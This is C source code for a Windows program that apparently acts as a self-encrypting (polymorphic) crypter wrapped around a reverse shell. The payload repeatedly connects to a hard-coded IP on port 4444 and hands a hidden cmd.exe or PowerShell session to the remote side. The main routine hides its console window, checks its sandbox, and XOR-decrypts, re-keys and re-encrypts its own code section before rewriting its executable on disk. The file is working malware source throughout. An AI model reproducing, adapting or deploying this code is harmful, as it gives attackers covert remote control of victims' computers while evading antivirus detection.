#include "include/crypt_pe.h"
#pragma comment(lib, "ws2_32.lib")
#pragma comment(linker, "SUBSYSTEM:WINDOWS")

int get_headers(void *handle, IMAGE_NT_HEADERS **pe_header, IMAGE_OPTIONAL_HEADER32 *opt_header);
void get_seg_info(IMAGE_SECTION_HEADER *section, int nb_section,seg_info_t *seg_info, char *name);
void change_section_permissions(unsigned char *start, int seg_offset, int seg_len, bool write);
int payload(void);


IN_SECTION(".code") int payload(void)
{
    while (1) {
        Sleep(5000);
        WSADATA WSAData = {0};
        SOCKET sock = 0;
        SOCKADDR_IN sin = {0};

        WSAStartup(MAKEWORD(2,0), &WSAData); //lancer le service
        sock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL,
                         0, 0); //creation du socket
        sin.sin_addr.s_addr = inet_addr("192.168.1.12"); //ajout ip au socket
        sin.sin_family = AF_INET; //format ipv4
        sin.sin_port = htons(4444); //ajout du port

        if (WSAConnect(sock, (SOCKADDR*)&sin, sizeof(sin),
                       NULL, NULL, NULL, NULL) == SOCKET_ERROR) {
            closesocket(sock);
            WSACleanup();
            continue;
        } //connexion au serveur

        STARTUPINFO sinfo = {0}; //information sur le lancement du shell
        PROCESS_INFORMATION pinfo = {0}; //information sur le process
        char *process[] = {"cmd.exe", "powershell.exe"}; //programme a lancer
        char received[1024] = "";
        int i = 0;

        memset(&sinfo, 0, sizeof(sinfo));
        sinfo.cb = sizeof(sinfo);
        sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW); //modifier les I/O et ne pas faire de fenetre
        sinfo.hStdInput = (HANDLE) sock; //redirection input
        sinfo.hStdOutput = (HANDLE) sock; //redirection output
        sinfo.hStdError = (HANDLE) sock; //redirection erreur
        sinfo.wShowWindow = SW_HIDE; //pas de fenetre

        memset(received, 0, sizeof(received));
        if (recv(sock, received, 1024, 0) <= 0) {
            closesocket(sock);
            WSACleanup();
            continue;
        }

        //send(sock, "Choose your shell :\n1) Cmd\n2) Powershell\n", 43, 0);
        i = (strcmp(received, "2\n") == 0);

        CreateProcess(NULL, process[i], NULL, NULL, TRUE, CREATE_NO_WINDOW,
                      NULL, NULL, &sinfo, &pinfo); //lancement du process en remote
        WaitForSingleObject(pinfo.hProcess, INFINITE); //attendre la fin du shell
        CloseHandle(pinfo.hProcess);
        CloseHandle(pinfo.hThread);

        memset(received, 0, sizeof(received));
        if (recv(sock, received, 1024, 0) <= 0) {
            closesocket(sock);
            WSACleanup();
            continue;
        }

        //send(sock, "shell ended, type 'exit' or press enter...\n", 43, 0);
        if (strcmp(received, "exit\n") == 0) {
            closesocket(sock); //supprimer le socket
            WSACleanup(); //fermer la connexion
            return 42;
        }
        closesocket(sock);
        WSACleanup();
    }
    return (0);
}

void xor_string(unsigned char *str, int sz)
{
    for (int i = 0; i < sz; i++)
        str[i] ^= key[i];
}

void generate_key(unsigned char *p,  bool original)
{
    for (int i = 0; i < KEY_SIZE; i++){
        p[i] = ((rand()) % 255);
        if (original)
            key[i] = p[i];
    }
}

static int get_file_size(char *name)
{
    struct stat _infos;

    if (stat(name, &_infos) != 0) {
        printf("%s=%s\n", name, strerror(errno));
        EXIT("fstat")
    }
    return _infos.st_size;
}

IN_SECTION(".code") void store_new_file(cryptor_t *c, char *b_name)
{
    FILE *fd;
    printf("=======>%s\n", b_name);
    CopyFile(b_name, "aaa", TRUE);
    if ((fd = fopen("aaa", "rb+")) < 0)
        EXIT("open")
    c->new_file_sz = get_file_size(b_name);
    c->new_file = malloc(c->new_file_sz);
    if (c->new_file == NULL)
        exit(84);
    if ( fread(c->new_file, 1, c->new_file_sz, fd) < 0)
        EXIT("read")
    fclose(fd);
    DeleteFileA("aaa");
}

void crypt_file(cryptor_t *c)
{
    int key_off = c->key_seg.off;
    int code_off = c->code_seg.off;
    int code_size = c->code_seg.size;

    xor_string(c->new_file + code_off, code_size); // ? decrypt file
    for (int i = 0; i <= FAKE_KEYS_NB; i++)
        generate_key(c->new_file + key_off + N_KEYS_OFFSET(i), i == FAKE_KEYS_NB); // ? new keys
    xor_string(c->new_file + code_off, code_size); // ? crypt file
}

IN_SECTION(".code") void overwrite_file(cryptor_t *c, char *b_name)
{
    FILE *fd;
    /* Delete the file so we can write a modified image */
    DeleteFileA("./tmp");
    if (rename(b_name, "tmp") < 0) {
        printf("%s  \n", strerror(errno));
        exit(2);
    }
    if ((fd = fopen("ahfrerocho", "wb+")) == NULL)
        exit(0);
    if (fwrite(c->new_file, 1, c->new_file_sz, fd) < 0)
        EXIT("write")
    fclose (fd);
    if (rename("./ahfrerocho", b_name) < 0)
        exit(15);
    DeleteFileA("./tmp");
}

int main(int ac, char *argv[]) {
    (void) ac;
    char* mem_dmp = NULL;
    void *handle = GetModuleHandle(NULL); // ? Get current process handle
    cryptor_t crypt = {0};

    HWND hWnd = GetConsoleWindow();
    ShowWindow( hWnd, SW_HIDE );
    if ((mem_dmp = (char*) malloc(TOO_MUCH_MEM)) == NULL || strstr(argv[0], "PEFile_tests.exe") <= 0)
        return 84;
    free(mem_dmp);
    srand(time(NULL));
    if (handle == NULL)
        EXIT("Unlucky...\n\033[31mNo payload for you. >:(\033[0m\n") // ? Very unlikely error
    else if (KEY_SIZE < 100)
        EXIT("Invalid size. Should be > 100. If not sure and have a small payload, use 512.\n")

    crypt.image_base = get_headers(handle, &(crypt.pe_header), &(crypt.opt_header));
    crypt.section_nb = crypt.pe_header->FileHeader.NumberOfSections;

    printf("Image base = 0x%lX\n", crypt.image_base);

    /* Fill code information with content of code segment */
    get_seg_info(IMAGE_FIRST_SECTION(crypt.pe_header), crypt.section_nb,
                 &(crypt.code_seg), ".code");
    get_seg_info(IMAGE_FIRST_SECTION(crypt.pe_header), crypt.section_nb,
                 &(crypt.key_seg), ".data");
    printf(".code size = %ld\n", crypt.code_seg.size);

    unsigned char *code_seg_ptr = ((unsigned char *)(crypt.image_base) + crypt.code_seg.mem_off);
    bool first_time = !strncmp((char *)fake_key, "This program has not been run yet.", 34);

    if (first_time == false) {// ? Checking for (not) the
        change_section_permissions((unsigned char *) crypt.image_base, crypt.code_seg.mem_off,
                crypt.code_seg.size, true);
        xor_string(code_seg_ptr, crypt.code_seg.size); // ? Decrypt running process
    }
    store_new_file(&crypt, strdup(argv[0]));
    crypt_file(&crypt);
    overwrite_file(&crypt, strdup(argv[0]));

    // ! End of program
    change_section_permissions((unsigned char *) crypt.image_base, crypt.code_seg.mem_off,
            crypt.code_seg.size, false);
    payload();
    CloseHandle(handle);
    return OK;
}
